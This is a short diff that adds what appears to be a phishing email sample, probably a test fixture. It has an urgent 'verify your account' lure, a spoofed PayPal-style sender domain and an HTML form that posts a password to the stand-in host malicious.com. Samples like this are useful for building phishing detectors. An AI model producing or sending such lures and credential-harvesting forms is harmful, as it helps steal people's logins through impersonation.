@@ -1,0 +1,8 @@
+Subject: Action Required: Verify Your Account
+From: support@paypal-security-team.net
+To: victim@company.com
+
+Please verify your account immediately. Login to continue using your services.
+<form action='http://malicious.com/login' method='POST'>
+  <input type='password' name='password' />
+</form>
